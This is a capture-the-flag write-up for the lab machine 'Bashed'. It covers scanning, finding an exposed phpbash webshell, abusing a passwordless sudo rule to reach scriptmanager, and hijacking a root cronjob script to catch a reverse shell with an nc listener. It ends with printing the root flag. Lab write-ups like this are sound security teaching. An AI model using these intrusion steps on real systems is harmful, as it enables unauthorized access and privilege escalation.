# Machine Name
```
Difficulty: Easy
Operating System: Linux
Hints: True
```
## Initial Enumeration
Running nmap scan (TCP) on the target shows the following
```
Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-19 10:12 CET
Nmap scan report for 10.10.10.68
Host is up (0.040s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Arrexel's Development Site
```
Here we can see that the running operating system is Ubuntu.  
Since this is the only port available let's dig deeper into it.  
Lets' start by poking around, when we hit the site we see a page containing:  
*phpbash helps a lot with pentesting. I have tested it on multiple different servers and it was very useful. I actually developed it on this exact server!*  
So, it seems like the creator of this box already uploaded a webshell for us, all we need to do is actually the location of this shell.
So, let's try to enumerate port 80 with gobuster and examine the results.   
```
/images               (Status: 301) [Size: 311] [--> http://10.10.10.68/images/]
/uploads              (Status: 301) [Size: 312] [--> http://10.10.10.68/uploads/]
/php                  (Status: 301) [Size: 308] [--> http://10.10.10.68/php/]
/css                  (Status: 301) [Size: 308] [--> http://10.10.10.68/css/]
/dev                  (Status: 301) [Size: 308] [--> http://10.10.10.68/dev/]
/js                   (Status: 301) [Size: 307] [--> http://10.10.10.68/js/]
/fonts                (Status: 301) [Size: 310] [--> http://10.10.10.68/fonts/]
/server-status        (Status: 403) [Size: 299]
```
If we visit the [Arrexel GitHub Repo](https://github.com/Arrexel/phpbash) (URL disclosed inside the site), we can see that this webshell is called phpbash.php.  
So, let's go through all this directory and see where phpbash.php is located.  
as we can easilly discover phpbash is available by hittinh http://10.10.10.68/dev/phpbash.php.  
Now we have accesso to this box as www-data.

## User
Now that we are logged in as www-data, we can quickly check our capabilities.
First thing first, let's enumerate sudo.
```
www-data@bashed:/var/www/html/uploads$ sudo -l
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```
Now we can easily escalate to scriptmanager and see if we can escalate privileges from there.
```
www-data@bashed:/var/www/html/uploads$ sudo -u scriptmanager /bin/bash
scriptmanager@bashed:/var/www/html/uploads$
```

## Root
Now, since the name of this user seems to refer to a scripting user, let's find files owned by him.
```
scriptmanager@bashed:/var/www/html/uploads$ find / -user scriptmanager | grep -v proc                                      
find: /scripts                                      
/scripts/test.py                                          
'/root': Permission denied                          
find: /home/scriptmanager                           
/home/scriptmanager/.profile                        
/home/scriptmanager/.bashrc                         
/home/scriptmanager/.nano                           
/home/scriptmanager/.bash_history                   
/home/scriptmanager/.bash_logout
```
Now, if we switch to /scripts directory we can see a simple script ```test.py``` that write text to ```test.txt```.  
Now, if we inspect dates/permissions wit a simple ls, we can see the following:
```
scriptmanager@bashed:/scripts$ ls -la
total 16
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 .
drwxr-xr-x 23 root          root          4096 Dec  4  2017 ..
-rw-r--r--  1 scriptmanager scriptmanager   58 Dec  4  2017 test.py
-rw-r--r--  1 root          root            12 Nov 19 01:47 test.txt
```
the file test.txt gets written every one minute and the owner/groop is root:root, so we can suppose that there is a cronjob that is writing test.txt each minute.  
If we edit test.py, we can set a python reverse shell, open a listener on our local machine and wait for the shell to pop up.  
```
root@kali:~/Documents/HTB/Boxes/Bashed# nc -lvnp 8083
listening on [any] 8083 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.10.68] 55988
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
cc4f0afe3a1026d402ba10329674a8e2
```
